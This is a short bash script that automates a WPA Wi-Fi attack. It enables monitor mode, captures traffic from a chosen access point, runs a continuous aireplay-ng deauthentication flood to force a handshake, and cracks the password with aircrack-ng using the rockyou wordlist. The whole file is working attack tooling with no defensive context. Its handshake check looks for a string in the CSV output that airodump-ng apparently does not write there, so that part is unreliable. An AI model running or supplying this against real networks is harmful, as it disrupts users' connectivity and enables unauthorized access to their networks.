#!/bin/bash

# Prompt for MAC address
read -p "Enter the target MAC Address: " MAC_ADDRESS

# Prompt for Channel
read -p "Enter the Channel: " CHANNEL

# Prompt for Capture Filename
read -p "Enter the filename for capture output: " CAPTURE_FILE

echo "Starting monitor mode on wlan0..."
sudo airmon-ng start wlan0

echo "Running airodump-ng to capture packets on channel $CHANNEL..."
sudo airodump-ng --bssid "$MAC_ADDRESS" --channel "$CHANNEL" -w "$CAPTURE_FILE" wlan0mon &
AIRODUMP_PID=$!

# Give airodump-ng some time to start capturing
sleep 5

echo "Starting deauthentication attack on $MAC_ADDRESS in a separate process..."
sudo aireplay-ng --deauth 0 -a "$MAC_ADDRESS" wlan0mon &

# Monitor the capture file for handshake notification
HANDSHAKE_CAPTURED=0
while [ $HANDSHAKE_CAPTURED -eq 0 ]; do
    if sudo grep -q "WPA handshake: $MAC_ADDRESS" "$CAPTURE_FILE"-01.csv; then
        echo "Handshake captured for $MAC_ADDRESS!"
        HANDSHAKE_CAPTURED=1
        # Stop airodump-ng and aireplay-ng
        sudo pkill -f "aireplay-ng --deauth"
        sudo kill $AIRODUMP_PID
    fi
    sleep 5
done

echo "Stopping monitor mode on wlan0..."
sudo airmon-ng stop wlan0mon

echo "Attempting to crack the password using aircrack-ng..."
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt "$CAPTURE_FILE"-01.cap
